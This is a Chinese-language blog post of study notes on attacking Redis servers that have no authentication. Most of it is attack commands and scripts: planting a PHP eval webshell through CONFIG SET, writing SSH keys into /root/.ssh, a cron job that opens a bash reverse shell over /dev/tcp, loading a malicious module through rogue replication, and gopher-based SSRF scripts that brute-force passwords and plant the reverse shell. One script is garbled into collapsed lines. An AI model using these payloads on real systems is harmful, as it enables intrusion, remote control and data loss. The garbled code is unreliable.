---
layout: post
title: redis 未授权使用
date: 2022-8-06
categories: blog
tags: [笔记,redis，测试]
description: redis在未授权登录后的利用学习笔记
---

这里是博客正文。

# **redis梳理**

redis命令了解 http://redisdoc.com/

**1.redis写入shell**（最常用的getshell套路，但因为权限问题，失败概率较高）

```shell
>CONFIG SET dir /VAR/WWW/HTML
>CONFIG SET dbfilename shell.php
>SET PAYLOAD '<?php eval($_GET[0]);?>'#set x "\r\n\r\n<?php phpinfo();?>\r\n\r\n" redis写入文件时会自带一些版本信息，不换行可能导致无法执行
>BGSAVE
```

tips:攻击者会在上线未授权或弱口令登录redis后在写马前，执行flushall,部分原因是因为redis数据都是缓存在内存中,所写内容有限，flushall清空数据来保证写马成功，但会造成数据丢失

利用条件：服务端连接redis存在未授权，并未登录验证
                  开了服务端存在web服务器，且知道web目录的路径

**2.写ssh&corn**（条件较为苛刻）

```shell
ssh-keygen -t rsa #生成密钥
cd .ssh & (echo -e "\n\n"; cat id_rsa.pub;echo -e "\n\n")>1.txt #本地执行将密钥写入
cat 1.txt | redis-cli -h x.x.x.x -x set crack #写入公钥 -x 代表从标准输⼊读取数据作为该命令的最后⼀个参数
>config set dir /root/.ssh
>config dbfilename keys
ssh -i id_rsa root@x.x.x.x #本地连接getshell

#写计划任务反弹shell
>set evil "\n\n*/1 * * * * /bin/bash -i>&/dev/tcp/x.x.x.x/1234 0>&1\n\n"
>config set dir /var/spool/cron
>config set  dbfilename root
>save
#局限性：redis写文件后的默认权限是644，但是ubuntu执行定时任务的权限是600，且ubun存在乱码会报错，所以写定时任务只能在centos上执行
```

利用已有脚本 hackredis.py

利用条件：服务端redis存在未授权，并未登录验证
                  服务端存在.ssh目录并且有写入权限

**3.设置主从复制加载恶意module**(也同样需要高权限操作，且数据同步容易删除目标redis上存储的数据)

设置目标机器为服务器的从属服务器

```shell
>SLAVEOF 127.0.0.1 7000 #设置7000的服务器为本服务的主服务器
>SLAVEOF NO ONE #取消主从复制
```

利用前验证环境可用性

```shell
>PING #测试连通性
>REPLCONF #刷新主从关系信息
>PSYNC/SYNC #验证是否可以正常连接
```

开始主从复制利用

```shell
#将目标redis设置为slave
>SLAVEOF IP port 
#设置redis数据库文件
>CONFIG SET dbfilename exp.so #主redis设置恶意模块
#加载恶意模块
>MODULE LOAD /var/lib/redis/exp.so #目标redis加载恶意模块
#实现命令执行
```

附录：redis module编写方法
编写模块不需要依赖redis或者其他库，只需要`#include "redismodule.h"`这个文件就可以编写
模块里必须有一个 `RedisModule_OnLoad() `函数，是模块入口点，可以在函数里定义模块名、新命令、新数据类型等等，其它内容与c,c#,cython写法相近

redis4.0以下可以通过主从复制把shell写入键值,新版本需要`protected-mode no`

**4.ssrf打redis**
利用gopher发送恶意代码攻击redis包括爆破redis弱口令和主从复制打redis爆破弱口令脚本：

```python
#参考代码
import urllib
import requests
import os

payload =
"""*2
$4
AUTH
${0}
{1}
QUIT
"""

with open("top500.txt") as f:
    for i in f:
        password = i.strip()
        length = len(password)
        poc = payload.format(length,password)
        tmp = urllib.parse.quote(poc)
        new = tmp.replace('%0A','%0D%0A')
        result = '_'+new
        result = "gopher://192.168.242.129:6379/"+result
        status = os.system('curl %s'%result)
        if status:
            print(password)
            break
            
import urllib
import requests
import os

payload =
"""*2
$4
AUTH
${0}
{1}
QUIT
"""
u ="http://127.0.0.1/?url={0}"

with open("top500.txt") as f:
    for i in f:
        password = i.strip()
        length = len(password)
        poc = payload.format(length,password)
        tmp = urllib.parse.quote(poc)
        new = tmp.replace('%0A','%0D%0A')
        result = '_'+new
        result = "gopher://192.168.242.129:6379/"+result
        url = u.format(result)
        print(url)
```

主从复制打redis工具：https://github.com/Dliv3/redis-rogue-server

附录：RESP协议
redis在1.2中引入RESP协议，redis2.0开始成为redis标准通信方式，例如下面的利用脚本。

```shell
*4
$6
config
$3
set
$3
dir
$5
/tmp/
*4
$6
config
$3
set
$10
dbfilename
$9
module.so
*3
$7
slaveof
$7 #ip长度
test.cn #ip
$4 #端口长度
8080 #端口
*3
$6
module
$4
load
$14
/tmp/module.so
*2
$11
system.exec
$2
id #执行的命令
*1
$4
quit
```

上述代码利用工具编码，使用gopher协议发包即可命令执行
rogue-sever.py需要一个死循环一直跑，防止目标redis连接上后就自动断开连接，导致exp.so没法传完

```shell
#do.sh
while ["1"="1"]
do
   python rogue-sever.py
done
```

tips：生成的payload需要二次编码后发送才能利用

```python
/*gopher协议反弹shell利⽤脚本*/
import urllib
protocol="gopher://"
ip="192.168.127.140"
port="6379"
reverse_ip="192.168.127.131"
reverse_port="7777"
cron="\n\n\n\n*/1 * * * * bash -i >& /dev/tcp/%s/%s 0>&1\n\n\n\n"%
(reverse_ip,reverse_port)
filename="root"
path="/var/spool/cron"
passwd=""
cmd=["flushall", "set 1 {}".format(cron.replace(" ","${IFS}")), "config set dir
{}".format(path), "config set dbfilename {}".format(filename), "save" ]
if passwd: cmd.insert(0,"AUTH {}".format(passwd))
payload=protocol+ip+":"+port+"/_"
def redis_format(arr): CRLF="\r\n" redis_arr = arr.split(" ") cmd=""
cmd+="*"+str(len(redis_arr)) for x in redis_arr:
cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
cmd+=CRLF return cmd if __name__=="__main__": for x in cmd: payload +=
urllib.quote(redis_format(x)) print payload
```

弱密码测试
`nc ip 6379` 这时就是连接成功
输入 `INFO` 或 `PING` 如果成功，则未设置密码，如果显示 `-NOAUTH Authentication required`，则设置了密码
输入 `auth 123456`，即进行密码认证，测几个弱密码就行

**5.redis 利用bypass**

5.1 数据库过大时，redis写shell技巧(即1中第三步)

```shell
set payload "\r\n\r\n<?php set_time_limit(0);$fp=fopen('evil.php','w');fwrite($fp,'<?php @eval($_POST[\"evil\"]);?>');\r\n\r\n"
exit();
?>"
```

